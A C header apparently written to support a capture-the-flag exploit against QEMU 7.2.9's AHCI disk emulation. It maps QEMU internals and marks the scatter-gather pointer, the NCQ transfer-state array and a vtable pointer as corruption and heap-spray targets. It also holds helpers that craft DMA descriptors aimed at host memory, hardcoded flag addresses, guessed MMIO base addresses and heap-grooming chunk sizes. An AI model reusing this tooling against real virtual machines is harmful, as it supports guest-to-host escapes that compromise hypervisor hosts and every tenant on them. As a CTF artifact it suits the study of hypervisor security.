/*
 * AHCI Internal Structures for QEMU 7.2.9 Exploitation
 * 
 * Extracted from: /tmp/qemu-src/hw/ide/ahci_internal.h
 * 
 * These structures are used for precise heap targeting and 
 * understanding QEMU's internal memory layout.
 */

#ifndef AHCI_INTERNAL_H
#define AHCI_INTERNAL_H

#include <stdint.h>
#include <stdbool.h>

/* ============================================================================
 * Constants from QEMU 7.2.9
 * ============================================================================ */

#define AHCI_MAX_CMDS           32   /* Max commands per port (NCQ depth) */
#define AHCI_MAX_PORTS          32   /* Max ports per controller */

#define AHCI_PRDT_SIZE_MASK     0x3FFFFF  /* Bits 21:0 of flags_size */

/* Port states */
#define STATE_RUN               0
#define STATE_RESET             1

/* Port Command register bits */
#define PORT_CMD_START          (1 << 0)   /* Start DMA engine */
#define PORT_CMD_SPIN_UP        (1 << 1)
#define PORT_CMD_POWER_ON       (1 << 2)
#define PORT_CMD_CLO            (1 << 3)
#define PORT_CMD_FIS_RX         (1 << 4)   /* FIS Receive Enable */
#define PORT_CMD_FIS_ON         (1 << 14)  /* FIS Receive Running */
#define PORT_CMD_LIST_ON        (1 << 15)  /* Command List Running */
#define PORT_CMD_ATAPI          (1 << 24)
#define PORT_CMD_ICC_MASK       (0xf << 28)
#define PORT_CMD_ICC_ACTIVE     (1 << 28)

/* Command Header options */
#define AHCI_CMD_HDR_CMD_FIS_LEN    0x1F
#define AHCI_CMD_HDR_ATAPI          (1 << 5)
#define AHCI_CMD_HDR_WRITE          (1 << 6)
#define AHCI_CMD_HDR_PREFETCH       (1 << 7)
#define AHCI_CMD_HDR_RESET          (1 << 8)
#define AHCI_CMD_HDR_BIST           (1 << 9)
#define AHCI_CMD_HDR_CLR_BUSY       (1 << 10)
#define AHCI_CMD_HDR_PMP            (0xF << 12)

/* SATA FIS Types */
#define SATA_FIS_TYPE_REGISTER_H2D  0x27
#define SATA_FIS_TYPE_REGISTER_D2H  0x34
#define SATA_FIS_TYPE_DMA_ACTIVATE  0x39
#define SATA_FIS_TYPE_DMA_SETUP     0x41
#define SATA_FIS_TYPE_DATA          0x46
#define SATA_FIS_TYPE_BIST          0x58
#define SATA_FIS_TYPE_PIO_SETUP     0x5F
#define SATA_FIS_TYPE_SDB           0xA1

/* ATA Commands */
#define ATA_CMD_READ_DMA            0xC8
#define ATA_CMD_READ_DMA_EXT        0x25
#define ATA_CMD_WRITE_DMA           0xCA
#define ATA_CMD_WRITE_DMA_EXT       0x35
#define ATA_CMD_READ_FPDMA_QUEUED   0x60  /* NCQ Read */
#define ATA_CMD_WRITE_FPDMA_QUEUED  0x61  /* NCQ Write */
#define ATA_CMD_IDENTIFY            0xEC
#define ATA_CMD_PACKET              0xA0
#define ATA_CMD_FLUSH_CACHE         0xE7

/* Port register offsets (from port base) */
#define PORT_REG_LST_ADDR       0x00  /* Command List Base */
#define PORT_REG_LST_ADDR_HI    0x04
#define PORT_REG_FIS_ADDR       0x08  /* FIS Base */
#define PORT_REG_FIS_ADDR_HI    0x0C
#define PORT_REG_IRQ_STAT       0x10
#define PORT_REG_IRQ_MASK       0x14
#define PORT_REG_CMD            0x18
#define PORT_REG_TFDATA         0x20
#define PORT_REG_SIG            0x24
#define PORT_REG_SCR_STAT       0x28  /* SATA Status */
#define PORT_REG_SCR_CTL        0x2C  /* SATA Control */
#define PORT_REG_SCR_ERR        0x30  /* SATA Error */
#define PORT_REG_SCR_ACT        0x34  /* NCQ: SACT register */
#define PORT_REG_CMD_ISSUE      0x38

/* Global HBA registers */
#define HBA_REG_CAP             0x00
#define HBA_REG_GHC             0x04
#define HBA_REG_IRQ_STAT        0x08
#define HBA_REG_PORTS_IMPL      0x0C
#define HBA_REG_VERSION         0x10
#define HBA_REG_CAP2            0x24

/* Port base calculation */
#define AHCI_PORT_BASE(port)    (0x100 + (port) * 0x80)

/* ============================================================================
 * QEMU Structures (from ahci_internal.h)
 * ============================================================================ */

/*
 * AHCI_SG - PRDT Entry (Physical Region Descriptor Table)
 * Size: 16 bytes
 * 
 * This is what we craft to point to arbitrary addresses.
 * The DMA engine uses these to determine where to read/write data.
 */
typedef struct __attribute__((packed)) AHCI_SG {
    uint64_t addr;           /* DMA address (can point to host memory!) */
    uint32_t reserved;
    uint32_t flags_size;     /* Byte count: (flags_size & 0x3FFFFF) + 1 */
                             /* Bit 31: Interrupt on Completion */
} AHCI_SG;

#define AHCI_SG_SIZE            16
#define PRDT_ENTRY_SIZE         AHCI_SG_SIZE

/* Helper to get size from flags_size field */
static inline uint32_t prdt_entry_size(const AHCI_SG *sg) {
    return (sg->flags_size & AHCI_PRDT_SIZE_MASK) + 1;
}

/*
 * AHCICmdHdr - Command Header (in Command List)
 * Size: 32 bytes
 * 
 * 32 of these per port, pointed to by PORT_LST_ADDR.
 * The 'prdtl' field controls how many PRDT entries are processed.
 */
typedef struct __attribute__((packed)) AHCICmdHdr {
    uint16_t opts;           /* Command options (FIS length, flags) */
    uint16_t prdtl;          /* PRDT length (number of entries) */
    uint32_t status;         /* Byte count transferred */
    uint64_t tbl_addr;       /* Command Table address */
    uint32_t reserved[4];
} AHCICmdHdr;

#define AHCI_CMD_HDR_SIZE       32

/*
 * Command Table Layout:
 * Offset 0x00-0x3F: Command FIS (64 bytes)
 * Offset 0x40-0x4F: ATAPI Command (16 bytes)
 * Offset 0x50-0x7F: Reserved (48 bytes)
 * Offset 0x80+:     PRDT entries (16 bytes each)
 */
#define CMD_TBL_FIS_OFFSET      0x00
#define CMD_TBL_FIS_SIZE        0x40
#define CMD_TBL_ATAPI_OFFSET    0x40
#define CMD_TBL_ATAPI_SIZE      0x10
#define CMD_TBL_RESERVED_SIZE   0x30
#define CMD_TBL_PRDT_OFFSET     0x80
#define CMD_TBL_HDR_SIZE        0x80

/* Calculate command table size for N PRDT entries */
#define CMD_TBL_SIZE(n)         (CMD_TBL_HDR_SIZE + (n) * PRDT_ENTRY_SIZE)

/*
 * AHCIPortRegs - Port Register State
 * Size: 0x80 bytes (128 bytes)
 * 
 * This matches the MMIO layout of port registers.
 */
typedef struct __attribute__((packed)) AHCIPortRegs {
    uint32_t lst_addr;       /* 0x00: Command List Base Address */
    uint32_t lst_addr_hi;    /* 0x04: Command List Base Address Upper */
    uint32_t fis_addr;       /* 0x08: FIS Base Address */
    uint32_t fis_addr_hi;    /* 0x0C: FIS Base Address Upper */
    uint32_t irq_stat;       /* 0x10: Interrupt Status */
    uint32_t irq_mask;       /* 0x14: Interrupt Enable */
    uint32_t cmd;            /* 0x18: Command and Status */
    uint32_t reserved0;      /* 0x1C */
    uint32_t tfdata;         /* 0x20: Task File Data */
    uint32_t sig;            /* 0x24: Signature */
    uint32_t scr_stat;       /* 0x28: SATA Status */
    uint32_t scr_ctl;        /* 0x2C: SATA Control */
    uint32_t scr_err;        /* 0x30: SATA Error */
    uint32_t scr_act;        /* 0x34: SATA Active (NCQ) */
    uint32_t cmd_issue;      /* 0x38: Command Issue */
    uint32_t reserved1[13];  /* 0x3C-0x6F */
    uint32_t vendor[4];      /* 0x70-0x7F: Vendor specific */
} AHCIPortRegs;

#define AHCI_PORT_REGS_SIZE     0x80

/*
 * QEMUSGList - Scatter-Gather List
 * Size: 40 bytes (on 64-bit)
 * 
 * This is embedded in NCQTransferState and is the TARGET for exploitation.
 * The 'sg' pointer can be corrupted to point to controlled data.
 */
typedef struct QEMUSGList {
    void *sg;                /* ScatterGatherEntry *sg - EXPLOIT TARGET */
    int nsg;                 /* Number of entries */
    int nalloc;              /* Allocated entries */
    uint64_t size;           /* Total size (dma_addr_t) */
    void *dev;               /* DeviceState * */
    void *as;                /* AddressSpace * */
} QEMUSGList;

#define QEMU_SGLIST_SIZE        40

/* Offset of 'sg' pointer within QEMUSGList */
#define SGLIST_SG_OFFSET        0

/*
 * NCQTransferState - NCQ Command State
 * Size: ~120 bytes (depends on QEMUSGList and BlockAcctCookie)
 * 
 * 32 of these per AHCIDevice (one per command slot).
 * The 'sglist' field is our primary exploitation target.
 * 
 * Layout (approximate offsets for 64-bit):
 *   0x00: AHCIDevice *drive      (8 bytes)
 *   0x08: BlockAIOCB *aiocb      (8 bytes)
 *   0x10: AHCICmdHdr *cmdh       (8 bytes)
 *   0x18: QEMUSGList sglist      (40 bytes) <- TARGET
 *   0x40: BlockAcctCookie acct   (~24 bytes)
 *   0x58: uint32_t sector_count  (4 bytes)
 *   0x5C: padding                (4 bytes)
 *   0x60: uint64_t lba           (8 bytes)
 *   0x68: uint8_t tag            (1 byte)
 *   0x69: uint8_t cmd            (1 byte)
 *   0x6A: uint8_t slot           (1 byte)
 *   0x6B: bool used              (1 byte)
 *   0x6C: bool halt              (1 byte)
 *   0x6D: padding                (3 bytes)
 */
typedef struct NCQTransferState {
    void *drive;             /* AHCIDevice *drive */
    void *aiocb;             /* BlockAIOCB *aiocb */
    void *cmdh;              /* AHCICmdHdr *cmdh */
    QEMUSGList sglist;       /* EMBEDDED - our target */
    uint8_t acct[24];        /* BlockAcctCookie (approximate) */
    uint32_t sector_count;
    uint64_t lba;
    uint8_t tag;
    uint8_t cmd;
    uint8_t slot;
    bool used;
    bool halt;
} NCQTransferState;

/* Key offsets within NCQTransferState */
#define NCQ_TFS_DRIVE_OFFSET        0x00
#define NCQ_TFS_AIOCB_OFFSET        0x08
#define NCQ_TFS_CMDH_OFFSET         0x10
#define NCQ_TFS_SGLIST_OFFSET       0x18   /* QEMUSGList starts here */
#define NCQ_TFS_SGLIST_SG_OFFSET    0x18   /* sg pointer within sglist */
#define NCQ_TFS_SECTOR_COUNT_OFFSET 0x58
#define NCQ_TFS_LBA_OFFSET          0x60
#define NCQ_TFS_TAG_OFFSET          0x68
#define NCQ_TFS_CMD_OFFSET          0x69
#define NCQ_TFS_SLOT_OFFSET         0x6A
#define NCQ_TFS_USED_OFFSET         0x6B
#define NCQ_TFS_HALT_OFFSET         0x6C

/* Estimated size of NCQTransferState */
#define NCQ_TFS_SIZE                0x70   /* ~112 bytes */

/*
 * AHCIDevice - Per-Port Device State
 * 
 * Contains an array of 32 NCQTransferState structures.
 * This is where heap spray targets go.
 * 
 * Layout (approximate):
 *   0x000: IDEDMA dma             (~32 bytes, contains vtable pointer!)
 *   0x020: IDEBus port            (~large, contains IDEState)
 *   0x???: int port_no
 *   0x???: uint32_t port_state
 *   0x???: uint32_t finished
 *   0x???: AHCIPortRegs port_regs (128 bytes)
 *   0x???: AHCIState *hba
 *   0x???: QEMUBH *check_bh
 *   0x???: uint8_t *lst           (command list pointer)
 *   0x???: uint8_t *res_fis       (received FIS pointer)
 *   0x???: bool done_first_drq
 *   0x???: int32_t busy_slot
 *   0x???: bool init_d2h_sent
 *   0x???: AHCICmdHdr *cur_cmd
 *   0x???: NCQTransferState ncq_tfs[32]  <- SPRAY TARGET (32 * ~112 = 3584 bytes)
 */

/* The IDEDMA structure contains a vtable pointer - critical for exploitation */
#define AHCI_DEV_DMA_OFFSET         0x00
#define AHCI_DEV_DMA_VTABLE_OFFSET  0x00   /* First field of IDEDMA is ops pointer */

/*
 * AHCIControlRegs - Global HBA Registers
 */
typedef struct AHCIControlRegs {
    uint32_t cap;            /* Host Capabilities */
    uint32_t ghc;            /* Global Host Control */
    uint32_t irqstatus;      /* Interrupt Status */
    uint32_t impl;           /* Ports Implemented */
    uint32_t version;        /* AHCI Version */
} AHCIControlRegs;

/*
 * AHCIState - Controller State
 */
typedef struct AHCIState {
    void *container;         /* DeviceState * */
    void *dev;               /* AHCIDevice * (array of ports) */
    AHCIControlRegs control_regs;
    /* ... MemoryRegion, irq, AddressSpace, etc ... */
} AHCIState;

/* ============================================================================
 * Exploitation Helpers
 * ============================================================================ */

/*
 * Build a Register H2D FIS (Host to Device)
 * This is the standard command FIS for issuing ATA commands.
 */
static inline void build_h2d_fis(uint8_t *fis, uint8_t command, 
                                  uint64_t lba, uint16_t count) {
    fis[0] = SATA_FIS_TYPE_REGISTER_H2D;
    fis[1] = 0x80;           /* Command bit set */
    fis[2] = command;
    fis[3] = 0;              /* Features low */
    fis[4] = lba & 0xFF;
    fis[5] = (lba >> 8) & 0xFF;
    fis[6] = (lba >> 16) & 0xFF;
    fis[7] = 0x40;           /* Device: LBA mode */
    fis[8] = (lba >> 24) & 0xFF;
    fis[9] = (lba >> 32) & 0xFF;
    fis[10] = (lba >> 40) & 0xFF;
    fis[11] = 0;             /* Features high */
    fis[12] = count & 0xFF;
    fis[13] = (count >> 8) & 0xFF;
    fis[14] = 0;             /* Reserved */
    fis[15] = 0;             /* Control */
    /* Bytes 16-19: Reserved */
}

/*
 * Build NCQ FIS (for FPDMA commands)
 * NCQ allows up to 32 outstanding commands with tags 0-31.
 */
static inline void build_ncq_fis(uint8_t *fis, uint8_t command,
                                  uint64_t lba, uint16_t count, uint8_t tag) {
    fis[0] = SATA_FIS_TYPE_REGISTER_H2D;
    fis[1] = 0x80;           /* Command bit set */
    fis[2] = command;        /* READ_FPDMA_QUEUED or WRITE_FPDMA_QUEUED */
    fis[3] = count & 0xFF;   /* Features = count low */
    fis[4] = lba & 0xFF;
    fis[5] = (lba >> 8) & 0xFF;
    fis[6] = (lba >> 16) & 0xFF;
    fis[7] = 0x40;           /* Device: LBA mode */
    fis[8] = (lba >> 24) & 0xFF;
    fis[9] = (lba >> 32) & 0xFF;
    fis[10] = (lba >> 40) & 0xFF;
    fis[11] = (count >> 8) & 0xFF;  /* Features high = count high */
    fis[12] = (tag << 3);    /* NCQ tag in bits 7:3 */
    fis[13] = 0;             /* Priority */
    fis[14] = 0;
    fis[15] = 0;
}

/*
 * Build PRDT entry
 */
static inline void build_prdt(AHCI_SG *sg, uint64_t addr, uint32_t size) {
    sg->addr = addr;
    sg->reserved = 0;
    /* Size field is (byte_count - 1), masked to 22 bits */
    sg->flags_size = (size > 0) ? ((size - 1) & AHCI_PRDT_SIZE_MASK) : 0;
}

/*
 * Build Command Header
 */
static inline void build_cmd_hdr(AHCICmdHdr *hdr, uint16_t opts, 
                                  uint16_t prdtl, uint64_t tbl_addr) {
    hdr->opts = opts;
    hdr->prdtl = prdtl;
    hdr->status = 0;
    hdr->tbl_addr = tbl_addr;
    hdr->reserved[0] = 0;
    hdr->reserved[1] = 0;
    hdr->reserved[2] = 0;
    hdr->reserved[3] = 0;
}

/* ============================================================================
 * CTF Target Addresses
 * ============================================================================ */

#define WRITE_FLAG_VIRT     0xffffffff826279a8ULL
#define WRITE_FLAG_PHYS     0x64279a8ULL
#define READ_FLAG_VIRT      0xffffffff82b5ee10ULL
#define READ_FLAG_PHYS      0x695ee10ULL

/* ============================================================================
 * Common AHCI Base Addresses (Physical MMIO)
 * ============================================================================ */

static const uint64_t AHCI_COMMON_BASES[] = {
    0xfebf0000,  /* ICH9 default */
    0xfebd0000,  
    0xfebf1000,
    0xfea00000,
    0xfe800000,
};
#define NUM_AHCI_BASES  (sizeof(AHCI_COMMON_BASES) / sizeof(AHCI_COMMON_BASES[0]))

/* ============================================================================
 * Heap Spray Chunk Sizes
 * 
 * These are the allocation sizes to target for heap grooming.
 * Based on QEMU's tcg/memory allocator behavior.
 * ============================================================================ */

/* ScatterGatherEntry is what gets allocated by qemu_sglist_init */
#define SG_ENTRY_SIZE           16   /* {dma_addr_t base, dma_addr_t len} */

/* Common allocation sizes in QEMU */
#define HEAP_CHUNK_64           64
#define HEAP_CHUNK_128          128
#define HEAP_CHUNK_256          256
#define HEAP_CHUNK_512          512
#define HEAP_CHUNK_656          0x290  /* NCQ-related allocations */

#endif /* AHCI_INTERNAL_H */